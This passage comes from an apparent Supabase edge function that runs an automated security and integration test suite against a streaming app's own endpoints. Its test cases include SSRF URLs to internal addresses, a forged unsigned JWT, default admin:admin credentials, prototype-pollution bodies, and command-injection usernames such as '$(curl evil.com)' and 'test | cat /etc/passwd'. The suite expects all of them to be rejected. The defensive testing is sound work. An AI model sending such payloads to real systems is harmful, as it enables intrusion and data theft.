  { name: "ssrf: stream-proxy 127.0.0.1", category: "security", fn: "stream-proxy", method: "POST", body: { url: "http://127.0.0.1/secret.mp4" }, expect: { status: [403] } },
  { name: "ssrf: stream-proxy 10.x interno", category: "security", fn: "stream-proxy", method: "POST", body: { url: "http://10.0.0.1/internal.mp4" }, expect: { status: [403] } },
  { name: "ssrf: stream-proxy 192.168.x", category: "security", fn: "stream-proxy", method: "POST", body: { url: "http://192.168.1.1/router.mp4" }, expect: { status: [403] } },

  // ═══════════════════════════════════════════════
  // CORS extra (4 tests)
  // ═══════════════════════════════════════════════
  { name: "CORS: abacatepay OPTIONS = 200", category: "security", fn: "abacatepay-webhook", method: "OPTIONS", expect: { status: [200, 204] } },
  
  { name: "CORS: user-presence OPTIONS = 200", category: "security", fn: "user-presence", method: "OPTIONS", expect: { status: [200, 204] } },
  { name: "CORS: system-health-check OPTIONS = 200", category: "security", fn: "system-health-check", method: "OPTIONS", expect: { status: [200, 204] } },

  // ═══════════════════════════════════════════════
  // Métodos HTTP bloqueados extra (3 tests)
  // ═══════════════════════════════════════════════
  
  { name: "method: google-sheets-sync GET = 405", category: "security", fn: "google-sheets-sync", method: "GET", expect: { status: [405] } },
  { name: "method: system-health-check PUT = 405", category: "security", fn: "system-health-check", method: "PUT", expect: { status: [405] } },

  // ═══════════════════════════════════════════════
  // Integridade de Dados — tabelas críticas (6 tests)
  // ═══════════════════════════════════════════════
  { name: "data: app_settings singleton existe", category: "integration", fn: "app-settings", method: "GET", expect: { status: [200], hasKey: "billing_enabled" } },
  { name: "data: clients_list acessível via manage-clients", category: "integration", fn: "manage-clients", method: "GET", headers: ADMIN_HDR, expect: { status: [200], hasKey: "clients" } },
  { name: "data: parse-m3u catálogo não está vazio", category: "integration", fn: "parse-m3u", method: "GET", expect: { status: [200], hasKey: "total" } },
  { name: "data: football-matches retorna estrutura válida", category: "integration", fn: "football-matches", method: "GET", expect: { status: [200] } },
  { name: "data: trailer-challenge retorna today válido", category: "integration", fn: "trailer-challenge", method: "GET", expect: { status: [200], hasKey: "today" } },
  { name: "data: content-alerts retorna array para user válido", category: "integration", fn: "content-alerts", method: "POST", body: { action: "list", username: "data_integrity_test" }, expect: { status: [200], hasKey: "alerts" } },

  // ═══════════════════════════════════════════════
  // Resiliência e Concorrência (6 tests)
  // ═══════════════════════════════════════════════
  { name: "resiliência: tmdb-proxy aceita requests consecutivos", category: "integration", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/trending/movie/week" }, expect: { status: [200], hasKey: "results" } },
  { name: "resiliência: user-presence heartbeat idempotente", category: "integration", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "resilience_test_user" }, expect: { status: [200], hasKey: "ok" } },
  { name: "resiliência: user-presence heartbeat repetido idempotente", category: "integration", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "resilience_test_user" }, expect: { status: [200], hasKey: "ok" } },
  { name: "resiliência: match-reminders list idempotente", category: "integration", fn: "match-reminders", method: "POST", body: { action: "list", username: "resilience_test" }, expect: { status: [200], hasKey: "reminders" } },
  { name: "resiliência: content-alerts add duplicado não crash", category: "integration", fn: "content-alerts", method: "POST", body: { action: "add", username: "resilience_dup", movie_id: 999999, movie_title: "Teste Resiliência" }, expect: { status: [200, 400, 409] } },
  { name: "resiliência: stream-proxy URL malformada não crash", category: "functional", fn: "stream-proxy", method: "POST", body: { url: "not-a-valid-url" }, expect: { status: [400, 403] } },

  // ═══════════════════════════════════════════════
  // Consistência de Autenticação — todos endpoints protegidos (6 tests)
  // ═══════════════════════════════════════════════
  { name: "auth-consistency: manage-clients POST sem auth = 401", category: "security", fn: "manage-clients", method: "POST", body: { clients: [{ u: "x", p: "y" }] }, expect: { status: [401] } },
  { name: "auth-consistency: push-test POST sem auth = 401", category: "security", fn: "push-test", method: "POST", body: { action: "send", username: "test" }, expect: { status: [401] } },
  { name: "auth-consistency: google-sheets-sync POST sem auth = 401", category: "security", fn: "google-sheets-sync", method: "POST", body: { spreadsheet_id: "x", clients: [] }, expect: { status: [401] } },
  { name: "auth-consistency: system-health-check DELETE sem auth = 401", category: "security", fn: "system-health-check", method: "DELETE", body: { id: "fake" }, expect: { status: [401] } },
  { name: "auth-consistency: n8n-proxy POST sem auth = 401", category: "security", fn: "n8n-proxy", method: "POST", body: { webhook_url: "https://example.com", payload: {} }, expect: { status: [401] } },
  { name: "auth-consistency: user-presence list_online sem auth = 401", category: "security", fn: "user-presence", method: "POST", body: { action: "list_online" }, expect: { status: [401] } },

  // ═══════════════════════════════════════════════
  // Validação de Arquitetura — respostas JSON consistentes (4 tests)
  // ═══════════════════════════════════════════════
  { name: "arquitetura: admin-login erro retorna JSON", category: "regression", fn: "admin-login", method: "POST", body: { user: "arch_test", pass: "arch_test" }, expect: { status: [401], hasKey: "error" } },
  { name: "arquitetura: client-login erro retorna JSON com success", category: "regression", fn: "client-login", method: "POST", body: { action: "login", username: "arch_nobody", password: "wrong" }, expect: { status: [200], hasKey: "success" } },
  { name: "arquitetura: manage-clients 401 retorna JSON com error", category: "regression", fn: "manage-clients", method: "GET", expect: { status: [401], hasKey: "error" } },
  { name: "arquitetura: push-test 401 retorna JSON", category: "regression", fn: "push-test", method: "POST", body: {}, expect: { status: [401], hasKey: "error" } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: IDOR — acessar dados de outro usuário (4 tests)
  // ═══════════════════════════════════════════════
  { name: "idor: content-alerts listar alertas de outro user não vaza dados sensíveis", category: "security", fn: "content-alerts", method: "POST", body: { action: "list", username: "vitima_idor_test" }, expect: { status: [200], hasKey: "alerts" } },
  { name: "idor: match-reminders listar lembretes de outro user", category: "security", fn: "match-reminders", method: "POST", body: { action: "list", username: "vitima_idor_test" }, expect: { status: [200], hasKey: "reminders" } },
  { name: "idor: trailer-challenge acessar progresso de outro user", category: "security", fn: "trailer-challenge", method: "POST", body: { action: "watch_trailer", username: "vitima_idor_test" }, expect: { status: [200] } },
  { name: "idor: user-presence logout de outro user sem ser admin", category: "security", fn: "user-presence", method: "POST", body: { action: "logout", username: "admin" }, expect: { status: [200, 400, 403] } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: Escalação de Privilégio (5 tests)
  // ═══════════════════════════════════════════════
  { name: "privesc: client tenta acessar manage-clients sem admin", category: "security", fn: "manage-clients", method: "GET", expect: { status: [401] } },
  { name: "privesc: client tenta rodar testes sem admin", category: "security", fn: "system-health-check", method: "POST", body: { trigger: "manual" }, expect: { status: [401] } },
  { name: "privesc: client tenta deletar resultados sem admin", category: "security", fn: "system-health-check", method: "DELETE", body: { all: true }, expect: { status: [401] } },
  { name: "privesc: client tenta enviar push sem admin", category: "security", fn: "push-test", method: "POST", body: { action: "send", title: "Hack", body: "pwned" }, expect: { status: [401] } },
  { name: "privesc: auth header com admin:admin (padrão fraco)", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": btoa("admin:admin") }, expect: { status: [401] } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: Token/Auth Manipulation (5 tests)
  // ═══════════════════════════════════════════════
  { name: "token: x-admin-auth com base64 inválido", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": "!!!invalid-base64!!!" }, expect: { status: [401] } },
  { name: "token: x-admin-auth vazio", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": "" }, expect: { status: [401] } },
  { name: "token: x-admin-auth com null bytes", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": btoa("admin\x00:pass\x00") }, expect: { status: [401] } },
  { name: "token: Authorization header forjado", category: "security", fn: "manage-clients", method: "GET", headers: { "Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoic2VydmljZV9yb2xlIn0." }, expect: { status: [401] } },
  { name: "token: x-admin-auth com separador extra", category: "security", fn: "manage-clients", method: "GET", headers: { "x-admin-auth": btoa("admin:pass:extra:fields") }, expect: { status: [401] } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: Prototype Pollution / JSON Injection (4 tests)
  // ═══════════════════════════════════════════════
  { name: "proto-pollution: __proto__ em client-login", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test", "__proto__": { "isAdmin": true } }, expect: { status: [200, 400, 403] } },
  { name: "proto-pollution: constructor.prototype em user-presence", category: "security", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "test", "constructor": { "prototype": { "admin": true } } }, expect: { status: [200, 400] } },
  { name: "json-inject: campo extra isAdmin em client-login", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test", isAdmin: true, role: "admin" }, expect: { status: [200, 400] } },
  { name: "json-inject: action override com array", category: "security", fn: "content-alerts", method: "POST", body: { action: ["list", "delete_all"], username: "test" }, expect: { status: [400, 500] } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: Enumeração de Usuários (3 tests)
  // ═══════════════════════════════════════════════
  { name: "enum: login inválido não revela se user existe (msg genérica)", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "usuario_que_nao_existe_xyz", password: "wrong" }, expect: { status: [200], hasKey: "success" } },
  { name: "enum: admin-login não diferencia user vs pass errado", category: "security", fn: "admin-login", method: "POST", body: { user: "real_admin_test", pass: "wrong" }, expect: { status: [401], hasKey: "error" } },
  { name: "enum: admin-login com user correto e pass errado = mesmo erro", category: "security", fn: "admin-login", method: "POST", body: { user: "nonexistent_admin", pass: "wrong" }, expect: { status: [401], hasKey: "error" } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: Header Injection (3 tests)
  // ═══════════════════════════════════════════════
  { name: "header-inject: content-type manipulado", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test" }, headers: { "Content-Type": "application/json; charset=utf-7" }, expect: { status: [200, 400] } },
  { name: "header-inject: x-forwarded-for spoofing", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test" }, headers: { "X-Forwarded-For": "127.0.0.1" }, expect: { status: [200, 400] } },
  { name: "header-inject: host header injection", category: "security", fn: "admin-login", method: "POST", body: { user: "x", pass: "y" }, headers: { "Host": "evil.com" }, expect: { status: [401] } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: Brute Force Simulation (2 tests)
  // ═══════════════════════════════════════════════
  { name: "bruteforce: 5 logins rápidos não crasham o sistema", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "brute_test_1", password: "attempt1" }, expect: { status: [200, 429] } },
  { name: "bruteforce: admin-login rápido não vaza info", category: "security", fn: "admin-login", method: "POST", body: { user: "brute_admin", pass: "attempt1" }, expect: { status: [401], notContains: ["admin_user", "admin_pass", "ADMIN_USER", "ADMIN_PASS"] } },

  // ═══════════════════════════════════════════════
  // 🔴 ATAQUE: Command Injection via campos (3 tests)
  // ═══════════════════════════════════════════════
  { name: "cmd-inject: username com pipe command", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test | cat /etc/passwd", password: "test" }, expect: { status: [400, 403] } },
  { name: "cmd-inject: username com backtick", category: "security", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "`whoami`" }, expect: { status: [400, 403] } },
  { name: "cmd-inject: username com $() substitution", category: "security", fn: "content-alerts", method: "POST", body: { action: "list", username: "$(curl evil.com)" }, expect: { status: [200, 400, 403] } },

  // ═══════════════════════════════════════════════
  // Cleanup de dados de teste (3 tests)
  // ═══════════════════════════════════════════════
  { name: "user-presence: cleanup hc_test", category: "functional", fn: "user-presence", method: "POST", body: { action: "logout", username: "health_check_test" }, expect: { status: [200] } },
  { name: "user-presence: cleanup hc_structural", category: "functional", fn: "user-presence", method: "POST", body: { action: "logout", username: "hc_structural_test" }, expect: { status: [200] } },
  { name: "user-presence: cleanup resilience_test", category: "functional", fn: "user-presence", method: "POST", body: { action: "logout", username: "resilience_test_user" }, expect: { status: [200] } },
];

// Custom deep validations beyond simple status/key checks
function runCustomValidation(test: TestCase, data: any): string | null {
  // parse-m3u: catalog must have >100 titles
  if (test.name === "parse-m3u: catálogo tem >100 títulos") {
    const total = data?.total || (Array.isArray(data?.titles) ? data.titles.length : 0);
    if (total < 100) return `Catálogo tem apenas ${total} títulos (mínimo: 100). O auto-refresh pode estar falhando.`;
  }

  // parse-m3u: must have recent updated_at (not older than 48h)
  if (test.name === "parse-m3u: catálogo tem updated_at") {
    const updatedAt = data?.updated_at;
    if (!updatedAt) return "Campo updated_at ausente — catálogo pode nunca ter sido processado.";
    const age = Date.now() - new Date(updatedAt).getTime();
    const maxAge = 336 * 60 * 60 * 1000; // 336 hours (2 weeks) — manual update cycle
    if (age > maxAge) {
      const hours = Math.round(age / (60 * 60 * 1000));
      return `Catálogo desatualizado há ${hours}h (máx: 336h). Atualizar manualmente no painel.`;
    }
  }

  // m3u-auto-refresh: must return count or skipped (accept error when source is down)
  if (test.name === "m3u-auto-refresh: retorna count ou skipped") {
    if (data?.error) return null; // Source URL unreachable = acceptable
    if (!data?.skipped && data?.count === undefined && data?.success === undefined) {
      return "Resposta sem 'count', 'success' ou 'skipped' — pipeline de sync pode estar quebrado.";
    }
  }

  // manage-clients: clients array should not be empty
  if (test.name === "manage-clients: GET clients é array não-vazio") {
    const clients = data?.clients;
    if (!Array.isArray(clients) || clients.length === 0) {
      return "Lista de clientes vazia — upload pode ter falhado ou tabela está sem dados.";
    }
  }

  // football-matches: should have some structure
  if (test.name === "football-matches: resposta tem matches ou fonte") {
    if (!data?.matches && !data?.fonte && !data?.cached && !data?.source && data?.length === undefined) {
      return "Resposta sem 'matches', 'fonte', 'cached' ou array — formato inesperado.";
    }
  }




  // tmdb-proxy search: results should be an array
  if (test.name === "tmdb-proxy: search retorna results") {
    if (!Array.isArray(data?.results)) {
      return "TMDB search não retornou array de results — proxy pode estar falhando.";
    }
    if (data.results.length === 0) {
      return "TMDB search por 'Matrix' retornou 0 results — API pode estar indisponível.";
    }
    // Verify poster_path exists in at least one result
    const hasPosters = data.results.some((r: any) => r.poster_path);
    if (!hasPosters) {
      return "Nenhum resultado do TMDB tem poster_path — posters não carregarão na aba Atualizações.";
    }
  }

  // m3u-auto-refresh: verify diff generation (accept error when source is down)
  if (test.name === "m3u-auto-refresh: gera diff em m3u_updates") {
    if (data?.error) return null; // Source URL unreachable = acceptable
    if (data?.skipped) return null; // OK if no source URL
    if (data?.success && data?.new_titles !== undefined) return null; // OK
    if (!data?.success && !data?.skipped) {
      return "Auto-refresh falhou sem skip — pipeline de diff pode estar quebrado.";
    }
  }

  // app-settings update via admin auth must work and keep boolean payload
  if (
    test.name === "app-settings: update com auth admin habilita cobrança" ||
    test.name === "app-settings: update com auth admin desabilita cobrança"
  ) {
    if (data?.success !== true) {
      return "Update de app-settings não retornou success=true — toggle do gestor pode estar quebrado.";
    }
    if (typeof data?.billing_enabled !== "boolean") {
      return "app-settings update não retornou billing_enabled boolean.";
    }
  }

  // app-settings GET should always keep singleton id
  if (test.name === "app-settings: GET mantém id=main") {
    if (data?.id !== "main") {
      return "app_settings singleton inconsistente (id diferente de 'main').";
    }
  }

  // match-reminders: list should return an array
  if (test.name === "match-reminders: list retorna array") {
    if (!Array.isArray(data?.reminders)) {
      return "Campo 'reminders' não é array — endpoint pode estar retornando formato incorreto.";
    }
  }

  // content-alerts: list should return an array
  if (test.name === "content-alerts: list retorna array") {
    if (!Array.isArray(data?.alerts)) {
      return "Campo 'alerts' não é array — endpoint pode estar retornando formato incorreto.";
    }
  }

  // user-presence: heartbeat should have ok=true
  if (test.name === "user-presence: heartbeat retorna ok=true") {
    if (data?.ok !== true) {
      return "Heartbeat não retornou ok=true — presença pode estar falhando.";
    }
  }

  // abacatepay: received must be true
  if (test.name === "abacatepay-webhook: received = true") {
    if (data?.received !== true) {
      return "Evento desconhecido não retornou received=true — webhook handler pode estar instável.";
    }
  }

  // Input sanitization: must NOT return success=true for dangerous characters
  if (test.name === "client-login: WAF bloqueia caracteres perigosos") {
    if (data?.success === true) {
      return "⚠️ CRÍTICO: caracteres perigosos no username retornou success=true — proteção falhou!";
    }
  }

  // Data integrity: catalog must not be empty
  if (test.name === "data: parse-m3u catálogo não está vazio") {
    const total = data?.total || (Array.isArray(data?.titles) ? data.titles.length : 0);
    if (total === 0) return "Catálogo M3U está completamente vazio — dados podem ter sido perdidos.";
  }

  // Data integrity: clients list should have entries
  if (test.name === "data: clients_list acessível via manage-clients") {
    if (!Array.isArray(data?.clients) || data.clients.length === 0) {
      return "Tabela clients_list sem registros — upload inicial pode não ter sido feito.";
    }
  }

  // Data integrity: football must return structured data
  if (test.name === "data: football-matches retorna estrutura válida") {
    if (!data?.matches && !Array.isArray(data) && !data?.cached && !data?.source) {
      return "Resposta de football-matches sem estrutura reconhecida.";
    }
  }

  // Resilience: stream-proxy malformed URL must not crash (500)
  if (test.name === "resiliência: stream-proxy URL malformada não crash") {
    if (data?.error && typeof data.error === "string" && data.error.includes("stack")) {
      return "Stream-proxy vazou stack trace em URL malformada — tratar exceção corretamente.";
    }
  }

  // Architecture: all 401 responses must be JSON with error key
  if (test.name.startsWith("arquitetura:") && test.expect.hasKey === "error") {
    if (typeof data !== "object" || !data?.error) {
      return "Resposta 401 não retornou JSON com campo 'error' — inconsistência de arquitetura.";
    }
  }

  // Prototype pollution: must NOT gain admin access
  if (test.name === "proto-pollution: __proto__ em client-login") {
    if (data?.success === true || data?.isAdmin === true) {
      return "⚠️ CRÍTICO: Prototype pollution permitiu bypass de autenticação!";
    }
  }
  if (test.name === "json-inject: campo extra isAdmin em client-login") {
    if (data?.isAdmin === true || data?.role === "admin") {
      return "⚠️ CRÍTICO: Campos extras no JSON foram aceitos para escalação de privilégio!";
    }
  }

  // Enumeration: error messages must be generic (not reveal user existence)
  if (test.name === "enum: login inválido não revela se user existe (msg genérica)") {
    if (data?.reason === "user_not_found" || data?.reason === "no_such_user") {
      return "⚠️ Enumeração: resposta diferencia 'user não existe' vs 'senha errada' — atacante pode enumerar usernames.";
    }
  }
  if (test.name.startsWith("enum: admin-login")) {
    const text = JSON.stringify(data || {}).toLowerCase();
    if (text.includes("user not found") || text.includes("username not found") || text.includes("no such user")) {
      return "⚠️ Enumeração: admin-login revela se o username existe — deve retornar erro genérico.";
    }
  }

  // Privilege escalation: default credentials must NOT work
  if (test.name === "privesc: auth header com admin:admin (padrão fraco)") {
    if (data?.clients || data?.success === true) {
      return "⚠️ CRÍTICO: Credenciais padrão admin:admin funcionam! Trocar imediatamente.";
    }
  }

  // Command injection must not return system output
  if (test.name.startsWith("cmd-inject:")) {
    const text = JSON.stringify(data || {}).toLowerCase();
    if (text.includes("root:") || text.includes("/bin/") || text.includes("uid=")) {
      return "⚠️ CRÍTICO: Command injection retornou output do sistema!";
    }
  }

  // JSON action override: array action should not be processed
  if (test.name === "json-inject: action override com array") {
    if (data?.alerts || data?.success === true) {
      return "⚠️ Action com array foi processada normalmente — validar tipo do campo action.";
    }
  }

  return null; // passed
}

async function runTest(baseUrl: string, anonKey: string, test: TestCase, retries = 5): Promise<{ name: string; category: string; passed: boolean; error?: string; duration_ms: number }> {
  const start = Date.now();
  const TIMEOUT_MS = test.fn === "n8n-proxy" ? 45000 : 30000; // n8n-proxy needs more time for cold starts

  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      let url = `${baseUrl}/functions/v1/${test.fn}`;
      if (test.method === "GET" && test.fn === "trailer-challenge") {
        url += "?username=health_check_test";
      }

      const headers: Record<string, string> = {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${anonKey}`,
        "apikey": anonKey,
        ...(test.headers || {}),
      };

      const opts: RequestInit = { method: test.method, headers };
      if (test.body && test.method !== "GET") {
        opts.body = JSON.stringify(test.body);
      }

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), TIMEOUT_MS);
      opts.signal = controller.signal;

      let res: Response;
      try {
        res = await fetch(url, opts);
      } catch (fetchErr: any) {
        clearTimeout(timeoutId);
        if (fetchErr.name === "AbortError") {
          return { name: test.name, category: test.category, passed: false, error: `Timeout (${TIMEOUT_MS / 1000}s) — função pode estar travada`, duration_ms: Date.now() - start };
        }
        throw fetchErr;
      }
      clearTimeout(timeoutId);

      // Rate limit detection — retry with exponential backoff
      if (res.status === 429) {
        const body = await res.text(); // consume body
        if (attempt < retries) {
          const delay = 3000 * attempt + Math.random() * 2000;
          console.log(`[Rate limit] ${test.name} — attempt ${attempt}/${retries}, waiting ${Math.round(delay)}ms`);
          await new Promise(r => setTimeout(r, delay));
          continue;
        }
        return { name: test.name, category: test.category, passed: false, error: "Rate limit exceeded for function", duration_ms: Date.now() - start };
      }

      const text = await res.text();
      let data: any;
      try { data = JSON.parse(text); } catch { data = text; }
      const duration_ms = Date.now() - start;

      // Check status
      if (test.expect.status && !test.expect.status.includes(res.status)) {
        return { name: test.name, category: test.category, passed: false, error: `Status ${res.status}, esperado ${test.expect.status.join("|")}`, duration_ms };
      }

      // Check hasKey
      if (test.expect.hasKey && typeof data === "object" && data !== null) {
        if (!(test.expect.hasKey in data)) {
          return { name: test.name, category: test.category, passed: false, error: `Chave "${test.expect.hasKey}" ausente na resposta`, duration_ms };
        }
      }

      // Check notContains
      if (test.expect.notContains) {
        const lower = text.toLowerCase();
        for (const forbidden of test.expect.notContains) {
          if (lower.includes(forbidden.toLowerCase())) {
            return { name: test.name, category: test.category, passed: false, error: `⚠️ VAZAMENTO: resposta contém "${forbidden}"`, duration_ms };
          }
        }
      }

      // Custom deep validations
      const customError = runCustomValidation(test, data);
      if (customError) {
        return { name: test.name, category: test.category, passed: false, error: customError, duration_ms };
      }

      // Warn on slow responses (>10s)
      if (duration_ms > 10000) {
        return { name: test.name, category: test.category, passed: true, error: `⚠️ Lento: ${Math.round(duration_ms / 1000)}s`, duration_ms };
      }

      return { name: test.name, category: test.category, passed: true, duration_ms };
    } catch (e) {
      if (attempt < retries) {
        const delay = 1500 * attempt;
        await new Promise(r => setTimeout(r, delay));
        continue;
      }
      return { name: test.name, category: test.category, passed: false, error: (e as Error).message, duration_ms: Date.now() - start };
    }
  }
  return { name: test.name, category: test.category, passed: false, error: "Max retries exceeded", duration_ms: Date.now() - start };
}

function validateAdmin(req: Request): boolean {
  const authHeader = req.headers.get("x-admin-auth") || "";
  const ADMIN_USER = Deno.env.get("ADMIN_USER");
  const ADMIN_PASS = Deno.env.get("ADMIN_PASS");
  if (!ADMIN_USER || !ADMIN_PASS) return false;
  try {
    const decoded = atob(authHeader);
    const [user, pass] = decoded.split(":");
    return user === ADMIN_USER && pass === ADMIN_PASS;
  } catch {
    return false;
  }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  // Allow cron triggers (POST with trigger=cron) without admin auth
  let isCronTrigger = false;
  if (req.method === "POST") {
    try {
      const cloned = req.clone();
      const body = await cloned.json();
      isCronTrigger = body?.trigger === "cron";
    } catch {}
  }

  // POST (run tests) and DELETE (remove results) require admin auth, except cron
  if ((req.method === "POST" || req.method === "DELETE") && !isCronTrigger && !validateAdmin(req)) {
    return new Response(
      JSON.stringify({ error: "Unauthorized" }),
      { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }

  const supabase = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
  );

  try {
    // GET = list results (public — read-only)
    if (req.method === "GET") {
      const { data: results } = await supabase
        .from("test_results")
        .select("*")
        .order("run_at", { ascending: false })
        .limit(20);

      return new Response(JSON.stringify({ results: results || [] }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // DELETE = remove one run or clear all
    if (req.method === "DELETE") {
      const reqUrl = new URL(req.url);
      let body: { id?: string; all?: boolean } = {};
      try {
        body = await req.json();
      } catch {
        body = {};
      }

      const allFromQuery = reqUrl.searchParams.get("all") === "true";
      const idFromQuery = reqUrl.searchParams.get("id") || undefined;
      const shouldDeleteAll = body.all || allFromQuery;
      const id = body.id || idFromQuery;

      if (shouldDeleteAll) {
        const { error } = await supabase.from("test_results").delete().gte("run_at", "1970-01-01T00:00:00Z");
        if (error) throw error;

        return new Response(JSON.stringify({ success: true, deleted: "all" }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      if (!id) {
        return new Response(JSON.stringify({ error: "Missing id" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const { error } = await supabase.from("test_results").delete().eq("id", id);
      if (error) throw error;

      return new Response(JSON.stringify({ success: true, id }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // POST = run tests (background execution to avoid CPU timeout)
    if (req.method === "POST") {
      let triggerType = "manual";
      try {
        const body = await req.json();
        triggerType = body?.trigger || "manual";
      } catch { }

      const baseUrl = Deno.env.get("SUPABASE_URL")!;
      const anonKey = Deno.env.get("SUPABASE_ANON_KEY") || Deno.env.get("SUPABASE_PUBLISHABLE_KEY") || "";
      const runId = crypto.randomUUID().slice(0, 8) + "-" + Date.now().toString(36);

      // Save billing state before tests (tests toggle it on/off)
      let savedBillingEnabled: boolean | null = null;
      try {
        const { data: settings } = await supabase.from("app_settings").select("billing_enabled").eq("id", "main").maybeSingle();
        if (settings) savedBillingEnabled = settings.billing_enabled;
      } catch {}

      // Create initial row so polling can see progress
      const { data: inserted } = await supabase.from("test_results").insert({
        run_id: runId,
        total_tests: TEST_SUITE.length,
        passed: 0,
        failed: 0,
        duration_ms: 0,
        trigger_type: triggerType,
        results: [],
      }).select("id").single();

      const rowId = inserted?.id;

      // Background execution using EdgeRuntime.waitUntil
      const backgroundWork = (async () => {
        const startTime = Date.now();
        const BATCH_SIZE = 3;
        const results: any[] = new Array(TEST_SUITE.length);
        
        for (let batchStart = 0; batchStart < TEST_SUITE.length; batchStart += BATCH_SIZE) {
          if (batchStart > 0) {
            await new Promise(r => setTimeout(r, 3000));
          }

          const batchEnd = Math.min(batchStart + BATCH_SIZE, TEST_SUITE.length);
          const batchPromises = [];
          
          for (let i = batchStart; i < batchEnd; i++) {
            batchPromises.push(
              runTest(baseUrl, anonKey, TEST_SUITE[i]).then(result => {
                results[i] = result;
              })
            );
          }

          await Promise.all(batchPromises);

          // Update partial results in DB for real-time polling
          if (rowId) {
            const completed = results.filter(Boolean);
            const passed = completed.filter(r => r.passed).length;
            const failed = completed.filter(r => !r.passed).length;
            await supabase.from("test_results").update({
              passed,
              failed,
              duration_ms: Date.now() - startTime,
              results: completed,
            }).eq("id", rowId);
          }
        }

        // Restore billing state after tests
        if (savedBillingEnabled !== null) {
          try {
            await supabase.from("app_settings").update({ billing_enabled: savedBillingEnabled }).eq("id", "main");
          } catch {}
        }

        const totalDuration = Date.now() - startTime;
        const passed = results.filter(r => r.passed).length;
        const failed = results.filter(r => !r.passed).length;

        // Final update
        if (rowId) {
          await supabase.from("test_results").update({
            passed,
            failed,
            duration_ms: totalDuration,
            results: results.filter(Boolean),
          }).eq("id", rowId);
        }

        // Keep only last 10 runs
        const { data: old } = await supabase
          .from("test_results")
          .select("id")
          .order("run_at", { ascending: false })
          .range(10, 999);

        if (old && old.length > 0) {
          await supabase.from("test_results").delete().in("id", old.map(r => r.id));
        }
      })();

      // Use EdgeRuntime.waitUntil for background processing
      // @ts-ignore - EdgeRuntime is available in Deno edge functions
      if (typeof EdgeRuntime !== "undefined" && EdgeRuntime.waitUntil) {
        // @ts-ignore
        EdgeRuntime.waitUntil(backgroundWork);
      } else {
        // Fallback: await directly (may timeout for large suites)
        await backgroundWork;
      }

      return new Response(JSON.stringify({
        run_id: runId,
        total: TEST_SUITE.length,
        status: "running",
        message: "Testes iniciados em background. Acompanhe o progresso pelo polling.",
      }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response("Method not allowed", { status: 405, headers: corsHeaders });
  } catch (e) {
    return new Response(JSON.stringify({ error: (e as Error).message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
